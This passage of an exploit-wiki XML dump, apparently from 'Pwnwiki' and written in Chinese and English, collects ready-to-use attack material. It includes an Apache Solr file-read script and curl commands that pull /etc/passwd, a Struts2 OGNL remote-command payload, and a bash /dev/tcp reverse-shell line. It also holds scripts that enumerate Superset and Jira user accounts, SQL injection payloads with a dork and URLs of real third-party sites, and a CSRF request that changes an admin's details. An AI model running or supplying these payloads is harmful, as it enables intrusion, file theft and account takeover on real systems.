User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36
Origin: http://118.31.46.134:8983
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://118.31.46.134:8983/solr/ckan/config
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Connection: close

stream.url=file:///etc/passwd
&lt;/pre&gt;


curl请求为：
&lt;pre&gt;
curl -d '{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}' http://xxx.xxx.xxx.xxx:8983/solr/{corename}/config -H 'Content-type:application/json'
curl "http://xxx.xxx.xxx.xxx:8983/solr/db/debug/dump?param=ContentStreams" -F "stream.url=file://etc/passwd" 
&lt;/pre&gt;

==POC==
&lt;pre&gt;
import requests
import sys
import random
import re
import base64
import time
from lxml import etree
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech           \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0        \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                        \033[0m')
    print('+  \033[34mVersion: Apache Solr &lt; 8.2.0            \033[0m')
    print('+  \033[36m使用格式: python3 CVE-2019-0193.py       \033[0m')
    print('+  \033[36mUrl    &gt;&gt;&gt; http://xxx.xxx.xxx.xxx:8983  \033[0m')
    print('+  \033[36mFile   &gt;&gt;&gt; 文件名称或目录                  \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    core_url = target_url + "/solr/admin/cores?indexInfo=false&amp;wt=json"
    try:
        response = requests.request("GET", url=core_url, timeout=10)
        core_name = list(json.loads(response.text)["status"])[0]
        print("\033[32m[o] 成功获得core_name,Url为：" + target_url + "/solr/" + core_name + "/config\033[0m")
        return core_name
    except:
        print("\033[31m[x] 目标Url漏洞利用失败\033[0m")
        sys.exit(0)

def POC_2(target_url, core_name):
    vuln_url = target_url + "/solr/" + core_name + "/config"
    headers = {
        "Content-type":"application/json"
    }
    data = '{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}'
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)
        print("\033[36m[o] 正在准备文件读取...... \033[0m".format(target_url))
        if "This" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {} 可能存在漏洞 \033[0m".format(target_url))
        else:
            print("\033[31m[x] 目标 {} 不存在漏洞\033[0m".format(target_url))
            sys.exit(0)

    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

def POC_3(target_url, core_name, File_name):
    vuln_url = target_url + "/solr/{}/debug/dump?param=ContentStreams".format(core_name)
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = 'stream.url=file://{}'.format(File_name)
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)
        if "No such file or directory" in response.text:    
            print("\033[31m[x] 读取{}失败 \033[0m".format(File_name))
        else:
            print("\033[36m[o] 响应为:\n{} \033[0m".format(json.loads(response.text)["streams"][0]["stream"]))


    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m"))
    core_name = POC_1(target_url)
    POC_2(target_url, core_name)
    while True:
        File_name = str(input("\033[35mFile &gt;&gt;&gt; \033[0m"))
        POC_3(target_url, core_name, File_name)
&lt;/pre&gt;</text>
      <sha1>64aoqxw38drg03iw0r8f3ulmnof7yf2</sha1>
    </revision>
  </page>
  <page>
    <title>Apache Solr任意文件讀取漏洞/zh-hant</title>
    <ns>0</ns>
    <id>3083</id>
    <revision>
      <id>3583</id>
      <timestamp>2021-05-26T15:04:13Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "發送以下數據包"</comment>
      <origin>3583</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="5379" sha1="md0rjot876wax4kpm0ulp8cd74bpenw" xml:space="preserve">&lt;languages   /&gt;

==漏洞影響==
&lt;pre&gt;
Apache Solr &lt;= 8.8.1
&lt;/pre&gt;

==漏洞利用==

首先進入管理員頁面，獲取core的信息：

&lt;pre&gt;
http://xxx.xxx.xxx.xxx/solr/admin/cores?indexInfo=false&amp;wt=json
&lt;/pre&gt;


發送以下數據包
&lt;pre&gt;
POST /solr/ckan/config HTTP/1.1
Host: xxx.xxx.xxx:8983
Content-Length: 99
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://118.31.46.134:8983
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://118.31.46.134:8983/solr/ckan/config
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Connection: close

{"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":true},"olrkzv64tv":"="}
&lt;/pre&gt;

==文件讀取==
&lt;pre&gt;
POST /solr/ckan/debug/dump?param=ContentStreams HTTP/1.1
Host: xxx.xxx.xxx.xxx:8983
Content-Length: 29
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36
Origin: http://118.31.46.134:8983
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://118.31.46.134:8983/solr/ckan/config
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Connection: close

stream.url=file:///etc/passwd
&lt;/pre&gt;


curl請求爲：
&lt;pre&gt;
curl -d '{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}' http://xxx.xxx.xxx.xxx:8983/solr/{corename}/config -H 'Content-type:application/json'
curl "http://xxx.xxx.xxx.xxx:8983/solr/db/debug/dump?param=ContentStreams" -F "stream.url=file://etc/passwd" 
&lt;/pre&gt;

==POC==
&lt;pre&gt;
import requests
import sys
import random
import re
import base64
import time
from lxml import etree
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech           \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0        \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                        \033[0m')
    print('+  \033[34mVersion: Apache Solr &lt; 8.2.0            \033[0m')
    print('+  \033[36m使用格式: python3 CVE-2019-0193.py       \033[0m')
    print('+  \033[36mUrl    &gt;&gt;&gt; http://xxx.xxx.xxx.xxx:8983  \033[0m')
    print('+  \033[36mFile   &gt;&gt;&gt; 文件名称或目录                  \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    core_url = target_url + "/solr/admin/cores?indexInfo=false&amp;wt=json"
    try:
        response = requests.request("GET", url=core_url, timeout=10)
        core_name = list(json.loads(response.text)["status"])[0]
        print("\033[32m[o] 成功获得core_name,Url为：" + target_url + "/solr/" + core_name + "/config\033[0m")
        return core_name
    except:
        print("\033[31m[x] 目标Url漏洞利用失败\033[0m")
        sys.exit(0)

def POC_2(target_url, core_name):
    vuln_url = target_url + "/solr/" + core_name + "/config"
    headers = {
        "Content-type":"application/json"
    }
    data = '{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}'
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)
        print("\033[36m[o] 正在准备文件读取...... \033[0m".format(target_url))
        if "This" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {} 可能存在漏洞 \033[0m".format(target_url))
        else:
            print("\033[31m[x] 目标 {} 不存在漏洞\033[0m".format(target_url))
            sys.exit(0)

    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

def POC_3(target_url, core_name, File_name):
    vuln_url = target_url + "/solr/{}/debug/dump?param=ContentStreams".format(core_name)
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = 'stream.url=file://{}'.format(File_name)
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)
        if "No such file or directory" in response.text:    
            print("\033[31m[x] 读取{}失败 \033[0m".format(File_name))
        else:
            print("\033[36m[o] 响应为:\n{} \033[0m".format(json.loads(response.text)["streams"][0]["stream"]))


    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m"))
    core_name = POC_1(target_url)
    POC_2(target_url, core_name)
    while True:
        File_name = str(input("\033[35mFile &gt;&gt;&gt; \033[0m"))
        POC_3(target_url, core_name, File_name)
&lt;/pre&gt;</text>
      <sha1>md0rjot876wax4kpm0ulp8cd74bpenw</sha1>
    </revision>
  </page>
  <page>
    <title>Apache Struts2-061漏洞</title>
    <ns>0</ns>
    <id>232</id>
    <revision>
      <id>364</id>
      <timestamp>2021-03-16T09:31:44Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==POC== &lt;pre&gt; POST /index.action HTTP/1.1  Host: Your IP:8080 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x..."</comment>
      <origin>364</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1226" sha1="1xj0ilisgmhxh091caifi6nsddu41pu" xml:space="preserve">==POC==
&lt;pre&gt;
POST /index.action HTTP/1.1

Host: Your IP:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF
Content-Length: 846


------WebKitFormBoundaryl7d1B1aGsV2wcZwF
Content-Disposition: form-data; name="id"


%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("ping p0fai2.dnslog.cn")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}
------WebKitFormBoundaryl7d1B1aGsV2wcZwF--
&lt;/pre&gt;</text>
      <sha1>1xj0ilisgmhxh091caifi6nsddu41pu</sha1>
    </revision>
    <revision>
      <id>365</id>
      <parentid>364</parentid>
      <timestamp>2021-03-16T09:32:31Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <origin>365</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2518" sha1="g2vttkq4ag7fo8t8ra0h77iiq7bgi6h" xml:space="preserve">==POC==
&lt;pre&gt;
POST /index.action HTTP/1.1

Host: Your IP:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF
Content-Length: 846


------WebKitFormBoundaryl7d1B1aGsV2wcZwF
Content-Disposition: form-data; name="id"


%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("ping p0fai2.dnslog.cn")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}
------WebKitFormBoundaryl7d1B1aGsV2wcZwF--
&lt;/pre&gt;

==命令執行==
&lt;pre&gt;
POST /index.action HTTP/1.1
Host: Your IP:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF
Content-Length: 827

------WebKitFormBoundaryl7d1B1aGsV2wcZwF
Content-Disposition: form-data; name="id"

%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("whoami")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}
------WebKitFormBoundaryl7d1B1aGsV2wcZwF--
&lt;/pre&gt;

==反彈shell==
&lt;pre&gt;
bash -i &gt;&amp; /dev/tcp/Your ip/Your port 0&gt;&amp;1
&lt;/pre&gt;</text>
      <sha1>g2vttkq4ag7fo8t8ra0h77iiq7bgi6h</sha1>
    </revision>
  </page>
  <page>
    <title>Apache Superset 1.1.0 基於時間的用戶枚舉漏洞</title>
    <ns>0</ns>
    <id>5311</id>
    <revision>
      <id>6082</id>
      <timestamp>2021-06-30T13:53:47Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;pre&gt; # Exploit Title: Apache Superset 1.1.0 - Time-Based Account Enumeration # Author: Dolev Farhi # Date: 2021-05-13 # Vendor Homepage: https://superset.apache.org/ # Versio..."</comment>
      <origin>6082</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1421" sha1="ia83qaqoelbawwd4bpyxrprclmiozkf" xml:space="preserve">&lt;pre&gt;
# Exploit Title: Apache Superset 1.1.0 - Time-Based Account Enumeration
# Author: Dolev Farhi
# Date: 2021-05-13
# Vendor Homepage: https://superset.apache.org/
# Version: 1.1.0
# Tested on: Ubuntu

import sys
import requests
import time

scheme = 'http'
host = '192.168.1.1'
port = 8080

# change with your wordlist
usernames = ['guest', 'admin', 'administrator', 'idontexist', 'superset']

url = '{}://{}:{}'.format(scheme, host, port)
login_endpoint = '/login/'

session = requests.Session()

def get_csrf():
  token = None
  r = session.get(url + login_endpoint, verify=False)

  for line in r.text.splitlines():
    if 'csrf_token' in line:
      try:
        token = line.strip().split('"')[-2]
      except:
        pass
  return token

csrf_token = get_csrf()

if not csrf_token:
  print('Could not obtain CSRF token, the exploit will likely fail.')
  sys.exit(1)

data = {
  'csrf_token':csrf_token,
  'username':'',
  'password':'abc'
}

attempts = {}
found = False

for user in usernames:
  start = time.time()
  data['username'] = user
  r = session.post(url + login_endpoint, data=data, verify=False, allow_redirects=True)
  roundtrip = time.time() - start
  attempts["%.4f" % roundtrip] = user

print('[!] Accounts existence probability is sorted from high to low')

count = 0

for key in sorted(attempts, reverse=True):
  count += 1
  print("%s. %s (timing: %s)" % (count, attempts[key], key))
&lt;/pre&gt;</text>
      <sha1>ia83qaqoelbawwd4bpyxrprclmiozkf</sha1>
    </revision>
  </page>
  <page>
    <title>Arhome</title>
    <ns>0</ns>
    <id>703</id>
    <revision>
      <id>941</id>
      <timestamp>2021-04-03T02:52:49Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "عربى"</comment>
      <origin>941</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="8" sha1="qbwmxa3gtaye2bk6w5n7w7nftjndprd" xml:space="preserve">عربى</text>
      <sha1>qbwmxa3gtaye2bk6w5n7w7nftjndprd</sha1>
    </revision>
  </page>
  <page>
    <title>Ariuswebstudio SQL注入漏洞</title>
    <ns>0</ns>
    <id>6122</id>
    <revision>
      <id>6996</id>
      <timestamp>2021-07-11T13:51:52Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;pre&gt; ********************************************************* #Exploit Title: ariuswebstudio - Sql Injection Vulnerability #Date: 2021-07-11 #Exploit Author: Behrouz Mansoor..."</comment>
      <origin>6996</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="855" sha1="8jb46a7hqa6qjxi7jh4jv0k154rw065" xml:space="preserve">&lt;pre&gt;
*********************************************************
#Exploit Title: ariuswebstudio - Sql Injection Vulnerability
#Date: 2021-07-11
#Exploit Author: Behrouz Mansoori
#Google Dork: "site by: www.ariuswebstudio.com"
#Category:webapps
#Tested On: windows 10, Firefox
 
 
Proof of Concept:
Search google Dork: "site by: www.ariuswebstudio.com"


### Demo :

http://lensfedernakulam.com/material.php?id=19%20/*!12345union*/%20/*!12345select*/%201,2,version(),4,5--

http://munnartourism.org/packagedetails.php?id=-35%27%20/*!12345UNION*/%20SELECT%201,version(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--+

********************************************************* 
#Discovered by: Behrouz mansoori
#Instagram: Behrouz_mansoori
#Email: mr.mansoori@yahoo.com
#site : www.bmansoori.ir
*********************************************************
&lt;/pre&gt;</text>
      <sha1>8jb46a7hqa6qjxi7jh4jv0k154rw065</sha1>
    </revision>
  </page>
  <page>
    <title>Artworks Gallery Management System 1.0 SQL注入漏洞</title>
    <ns>0</ns>
    <id>2794</id>
    <revision>
      <id>3295</id>
      <timestamp>2021-05-26T13:10:26Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: Artworks Gallery Management System 1.0 - 'id' SQL Injection # Exploit Author: Vijay Sachdeva # Date: 2020-12-22 # Vendor Homepage: https://www.s..."</comment>
      <origin>3295</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1649" sha1="2xdck85f75z27p1cyg07xmgjaqu3ugh" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: Artworks Gallery Management System 1.0 - 'id' SQL Injection
# Exploit Author: Vijay Sachdeva
# Date: 2020-12-22
# Vendor Homepage: https://www.sourcecodester.com/php/14634/artworks-gallery-management-system-php-full-source-code.html
# Software Link: https://www.sourcecodester.com/download-code?nid=14634&amp;title=Artworks+Gallery+Management+System+in+PHP+with+Full+Source+Code
# Affected Version: Version 1
# Tested on Kali Linux

Step 1. Log in to the application with admin credentials.

Step 2. Click on "Explore" and then select "Artworks".

Step 3. Choose any item, the URL should be "

http://localhost/art-bay/info_art.php?id=6

Step 4. Run sqlmap on the URL where the "id" parameter is given


sqlmap -u "http://192.168.1.240/art-bay/info_art.php?id=8" --banner

---


Parameter: id (GET)

    Type: boolean-based blind

    Title: AND boolean-based blind - WHERE or HAVING clause

    Payload: id=8 AND 4531=4531


    Type: time-based blind

    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)

    Payload: id=8 AND (SELECT 7972 FROM (SELECT(SLEEP(5)))wPdG)


    Type: UNION query

    Title: Generic UNION query (NULL) - 9 columns

    Payload: id=8 UNION ALL SELECT
NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b627171,0x63435455546f41476e584f4a66614e445968714d427647756f6f48796153686e756f66715875466c,0x716a6b6b71)--
-

---

[08:18:34] [INFO] the back-end DBMS is MySQL

[08:18:34] [INFO] fetching banner

back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)

banner: '10.3.24-MariaDB-2'


---


Step 5. Sqlmap should inject the web-app successfully which leads to
information disclosure.
&lt;/pre&gt;</text>
      <sha1>2xdck85f75z27p1cyg07xmgjaqu3ugh</sha1>
    </revision>
  </page>
  <page>
    <title>Ashop Shopping Cart Software SQL注入漏洞</title>
    <ns>0</ns>
    <id>1617</id>
    <revision>
      <id>2021</id>
      <timestamp>2021-05-02T04:41:41Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==POC== &lt;pre&gt; # Exploit Title: Ashop Shopping Cart Software - SQL Injection # Date: 03.03.2019 # Exploit Author: Ahmet Ümit BAYRAM # Vendor Homepage: http://www.ashopsoftware..."</comment>
      <origin>2021</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="651" sha1="907xbd0gw4pbwfs6aswiphodllgzl6a" xml:space="preserve">==POC==
&lt;pre&gt;
# Exploit Title: Ashop Shopping Cart Software - SQL Injection
# Date: 03.03.2019
# Exploit Author: Ahmet Ümit BAYRAM
# Vendor Homepage: http://www.ashopsoftware.com
# Software Link: https://sourceforge.net/projects/ashop/
# Demo Site: http://demo.ashopsoftware.com/
# Version: Lastest
# Tested on: Kali Linux
# CVE: N/A

----- PoC: SQLi -----

Request: http://localhost/[PATH]/index.php?cat=1&amp;exp=&amp;shop=1
Vulnerable Parameter: shop (GET)
Payload: cat=1&amp;exp=&amp;shop=-5438') UNION ALL SELECT
CONCAT(0x71786b6a71,0x6357557777645143654a726369774c4167665278634a46617758614d66506b46434f4b7669565054,0x716a787671),NULL--
fmIb
            
&lt;/pre&gt;</text>
      <sha1>907xbd0gw4pbwfs6aswiphodllgzl6a</sha1>
    </revision>
  </page>
  <page>
    <title>Atlassian Jira 8.15.0 信息泄漏（用戶名枚舉）漏洞</title>
    <ns>0</ns>
    <id>3330</id>
    <revision>
      <id>3888</id>
      <timestamp>2021-06-02T01:14:02Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: Atlassian Jira 8.15.0 - Information Disclosure (Username Enumeration) # Date: 31/05/2021 # Exploit Author: Mohammed Aloraimi # Vendor Homepage:..."</comment>
      <origin>3888</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2094" sha1="bg4quhqshmspeu85u48kq5xa5qokazz" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: Atlassian Jira 8.15.0 - Information Disclosure (Username Enumeration)
# Date: 31/05/2021
# Exploit Author: Mohammed Aloraimi
# Vendor Homepage: https://www.atlassian.com/
# Software Link: https://www.atlassian.com/software/jira
# Vulnerable versions: version 8.11.x to 8.15.0
# Tested on: Kali Linux
# Proof Of Concept:

'''
A username information disclosure vulnerability exists in Atlassian JIRA from versions 8.11.x to 8.15.x. Unauthenticated users can ENUMRATE valid users via /secure/QueryComponent!Jql.jspa endpoint.

Tested versions:

Atlassian JIRA 8.11.1
Atlassian JIRA 8.13
Atlassian JIRA 8.15
'''

#!/usr/bin/env python

__author__  = "Mohammed Aloraimi (@ixSly)"



import requests
import sys
import re
import urllib3
urllib3.disable_warnings()


def help():
    print('python script.py &lt;target&gt; &lt;username&gt;')
    print('e.g. python script.py https://jiratarget.com admin')
    sys.exit()

if len(sys.argv) &lt; 3:
  help()



def pwn(url,username):

        try:
                headers = {"content-type": "application/x-www-form-urlencoded; charset=UTF-8"}
                data="jql=creator+in+({})&amp;decorator=none".format(username)
                req = requests.post(url+"/secure/QueryComponent!Jql.jspa",headers=headers,verify=False,data=data)
                if "issue.field.project" in req.text and req.status_code == 200:
                        print("[+] {} is a Valid User".format(username))
                        userFullName=re.search('value=\"user:{}\" title=\"(.+?)\"'.format(username),str(req.json()["values"]["creator"]).strip())
                        if userFullName:
                                print("[+] User FullName: " + userFullName.group(1))
                elif '["jqlTooComplex"]' in req.text and req.status_code == 401:
                        print("[-] {} is not a Valid User".format(username))
                else:
                        print("[-] Error..")
        except Exception as e:
                print(str(e))
                pass

server = sys.argv[1]
username = sys.argv[2]


pwn(server,username)
&lt;/pre&gt;</text>
      <sha1>bg4quhqshmspeu85u48kq5xa5qokazz</sha1>
    </revision>
  </page>
  <page>
    <title>B2evolution 7.2.2 CSRF漏洞</title>
    <ns>0</ns>
    <id>5384</id>
    <revision>
      <id>6178</id>
      <timestamp>2021-07-03T01:57:16Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;pre&gt; # Exploit Title: b2evolution 7.2.2 - 'edit account details' Cross-Site Request Forgery (CSRF) # Exploit Author: Alperen Ergel (@alpernae) # Vendor Homepage: https://b2ev..."</comment>
      <origin>6178</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="6032" sha1="8g11vjxodg539u20cb3fibxqx9mfh3x" xml:space="preserve">&lt;pre&gt;
# Exploit Title: b2evolution 7.2.2 - 'edit account details' Cross-Site Request Forgery (CSRF)
# Exploit Author: Alperen Ergel (@alpernae)
# Vendor Homepage: https://b2evolution.net/
# Software Link: https://b2evolution.net/downloads/7-2-2
# Version : 7.2.2
# Tested on: Kali Linux
# Category: WebApp

######## Description ########

Allows to attacker change admin account details.  

######## Proof of Concept ########

===&gt; REQUEST &lt;==== 

POST /b2evolution/evoadm.php HTTP/1.1
Host: s2.demo.opensourcecms.com
Cookie: session_b2evo=1387_5XjmCda2lrphrrPvEEZqHq0CANmMmGDt; 
__cmpconsentx19318=CPIqFKEPIqFKEAfUmBENBgCsAP_AAH_AAAYgG9tf_X_fb3_j-_59__t0eY1f9_7_v-0zjheds-8Nyd_X_L8X_2M7vB36pr4KuR4ku3bBAQdtHOncTQmx6IlVqTPsb02Mr7NKJ7PEmlsbe2dYGH9_n9XT_ZKZ79_____7________77______3_v__9-BvbX_1_329_4_v-ff_7dHmNX_f-_7_tM44XnbPvDcnf1_y_F_9jO7wd-qa-CrkeJLt2wQEHbRzp3E0JseiJVakz7G9NjK-
zSiezxJpbG3tnWBh_f5_V0_2Sme_f____-________--______9_7___fgAAA; __cmpcccx19318=aBPIqFKEgAADAAXAA0AB4AQ4DiQKnAAA; 
_ga=GA1.2.1294565572.1625137627; _gid=GA1.2.967259237.1625137627; __gads=ID=b3a3eb6f723d6f76-2210340b6fc800b7:T=1625137656:RT=1625137656:S=ALNI_MaB1e9iPH5NWYZhtIxGIyqg8LXMOA
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 1031
Origin: https://s2.demo.opensourcecms.com
Referer: https://s2.demo.opensourcecms.com/b2evolution/evoadm.php?blog=1&amp;ctrl=user&amp;user_tab=profile&amp;user_ID=1&amp;action=edit&amp;user_tab=profile
Upgrade-Insecure-Requests: 1
Te: trailers
Connection: close

## &lt; SNIPP &gt; 

edited_user_login=opensourcecms&amp;edited_user_firstname=Hacker&amp;edited_user_lastname=Hacker&amp;edited_user_nickname=demo&amp;edited_user_gender=M&amp;edited_user_ctry_ID=233&amp;edited_user_rgn_ID=&amp;edited_user_subrg_ID=&amp;edited_user_city_ID=
&amp;edited_user_age_min=&amp;edited_user_age_max=&amp;edited_user_birthday_month=&amp;edited_user_birthday_day=&amp;edited_user_birthday_year=&amp;organizations%5B%5D=1&amp;org_roles%5B%5D=King+of+Spades&amp;org_priorities%5B%5D=&amp;uf_1=I+am+the+demo+administrator+of+this+site.%0D%0AI+love+having+so+much+power%21&amp;uf_new%5B2%5D%5B%5D=
&amp;uf_new%5B3%5D%5B%5D=&amp;uf_2=https%3A%2F%2Ftwitter.com%2Fb2evolution%2F&amp;uf_3=https%3A%2F%2Fwww.facebook.com%2Fb2evolution&amp;uf_4=https%3A%2F%2Fplus.google.com%2F%2Bb2evolution%2Fposts&amp;uf_5=https%3A%2F%2Fwww.linkedin.com%2Fcompany%2Fb2evolution-net&amp;uf_6=https%3A%2F%2Fgithub.com%2Fb2evolution%2Fb2evolution&amp;uf_7=
